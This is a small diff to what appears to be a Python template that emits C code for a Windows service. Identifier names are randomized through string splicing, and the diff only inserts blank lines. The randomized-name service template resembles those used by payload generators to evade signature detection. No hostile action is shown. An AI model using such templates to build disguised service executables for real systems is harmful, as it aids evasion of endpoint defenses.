@@ -110,8 +110,11 @@ VOID ServiceMain( DWORD dwNumServicesArgs, LPSTR * lpServiceArgVectors )
 	ZeroMemory( &pi, sizeof(PROCESS_INFORMATION) );
 	si.cb = sizeof(STARTUPINFO);
 	"""+rand+""".dwServiceType = SERVICE_WIN32_SHARE_PROCESS;
+	
 	"""+rand+""".dwCurrentState = SERVICE_START_PENDING;
+	
 	"""+rand+""".dwControlsAccepted = SERVICE_ACCEPT_STOP|SERVICE_ACCEPT_SHUTDOWN;
+	
 	hStatus = RegisterServiceCtrlHandler( (LPCSTR)&cServiceName, (LPHANDLER_FUNCTION)ServiceHandler );
 	if ( hStatus )
 	{
